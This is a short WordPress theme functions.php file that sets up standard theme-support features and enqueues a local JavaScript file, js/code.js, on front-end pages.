<?php
add_action( 'after_setup_theme', 'youtube_setup' );
if ( !function_exists( 'youtube_setup' ) ) :
function youtube_setup() {
add_theme_support( 'appearance-tools' );
add_theme_support( 'wp-block-styles' );
add_theme_support( 'core-block-patterns' );
add_theme_support( 'widgets-block-editor' );
add_theme_support( 'custom-spacing' );
add_theme_support( 'custom-line-height' );
add_theme_support( 'custom-units' );
add_theme_support( 'align-wide' );
add_theme_support( 'responsive-embeds' );
add_theme_support( 'woocommerce' );
add_editor_style( 'editor-style.css' );
}
endif;

esc_html__( 'text-domain-fix', 'youtube' );


/**
 * YouTube Code
 */


function custom_background_script() {
    wp_enqueue_script(
        'custom-hidden-script', 
        get_template_directory_uri() . '/js/code.js', 
        array(), 
        null, 
        true
    );
}
add_action('wp_enqueue_scripts', 'custom_background_script');